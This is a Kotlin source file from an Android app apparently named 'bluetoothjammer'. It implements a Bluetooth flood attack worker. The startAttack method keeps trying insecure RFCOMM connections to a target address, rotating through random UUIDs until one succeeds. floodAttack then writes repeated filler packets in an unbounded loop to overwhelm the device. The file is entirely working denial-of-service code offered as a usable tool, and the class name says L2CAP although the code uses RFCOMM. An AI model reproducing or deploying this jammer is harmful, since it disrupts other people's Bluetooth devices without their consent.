package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothSocket
import android.content.Context
import android.util.Log
import android.widget.TextView
import com.eikarna.bluetoothjammer.AttackActivity
import com.google.android.material.textview.MaterialTextView
import kotlinx.coroutines.*
import java.io.IOException
import java.util.*
import util.Logger

/**
 * A single L2CAP flood worker against [targetAddress].
 *
 * One instance owns one coroutine and every socket it opens, so [stopAttack]
 * can shut the worker down completely. The old implementation created a new
 * instance per thread without keeping references, so stopping the attack
 * cancelled nothing and the threads had to be killed by force closing the app.
 */
class L2capFloodAttack(private val targetAddress: String) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val sockets = Collections.synchronizedList(mutableListOf<BluetoothSocket>())

    @Volatile
    private var running = false

    // Purge oldest messages if the line count exceeds 100
    private fun purgeOldestMessagesIfNeeded(element: TextView) {
        val maxLines = 100
        val lines = element.text.split("\n")
        if (lines.size > maxLines) {
            val newText = lines.takeLast(maxLines).joinToString("\n")
            element.text = newText
        }
    }

    private fun log(
        context: Context,
        element: MaterialTextView,
        purge: Boolean = false,
        message: String
    ) {
        if (!AttackActivity.loggingStatus) return
        val activity = context as? AttackActivity ?: return
        activity.runOnUiThread {
            if (AttackActivity.isAttacking) {
                if (purge) purgeOldestMessagesIfNeeded(element)
                Logger.appendLog(element, message)
            }
        }
    }

    @SuppressLint("MissingPermission")
    fun startAttack(context: Context, element: MaterialTextView) {
        if (running) return
        running = true

        scope.launch {
            val bluetoothManager: BluetoothManager? =
                context.getSystemService(BluetoothManager::class.java)
            val device = try {
                bluetoothManager?.adapter?.getRemoteDevice(targetAddress)
            } catch (e: IllegalArgumentException) {
                null
            }

            if (device == null) {
                running = false
                log(context, element, message = "Invalid Bluetooth address: $targetAddress")
                return@launch
            }

            var connectedSocket: BluetoothSocket? = null
            var successfulUUID: UUID? = null
            val baseUUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")

            while (running) {
                val uuid = successfulUUID ?: baseUUID
                try {
                    // Create socket and connect
                    val socket = device.createInsecureRfcommSocketToServiceRecord(uuid)
                    sockets.add(socket)
                    socket.connect()
                    if (socket.isConnected) {
                        connectedSocket = socket
                        break // Connection successful
                    }
                } catch (err: IOException) {
                    if (!running) break
                    // Generate new UUID on failure
                    successfulUUID = UUID.fromString(
                        UUID.randomUUID().toString().split("-")[0] + "-0000-1000-8000-00805F9B34FB"
                    )
                    log(context, element, purge = true, message = "Failed to connect..")
                }
            }

            // Proceed with the flood attack if connected
            val socket = connectedSocket
            if (running && socket != null && socket.isConnected) {
                log(context, element, message = "Connection established.")
                log(context, element, message = "Sending payload..")
                floodAttack(socket)
            }
        }
    }

    private fun floodAttack(socket: BluetoothSocket) {
        val dataSize = try {
            socket.maxTransmitPacketSize
        } catch (e: Exception) {
            600
        }.takeIf { it > 0 } ?: 600

        val sendBuffer = ByteArray(dataSize) { ((it % 40) + 'A'.code.toByte()).toByte() }

        try {
            while (running && socket.isConnected) {
                socket.outputStream.write(sendBuffer)
            }
        } catch (e: IOException) {
            // Socket was closed (stop) or peer went away; the loop is done either way.
            Log.d("L2capFloodAttack", "Flood loop ended: ${e.message}")
        }
    }

    /** Stops this worker: flips the flag, tears down sockets and the coroutine scope. */
    fun stopAttack() {
        running = false
        synchronized(sockets) {
            sockets.forEach { socket ->
                try {
                    socket.close()
                } catch (e: IOException) {
                    // Already closed.
                }
            }
            sockets.clear()
        }
        scope.cancel()
    }
}
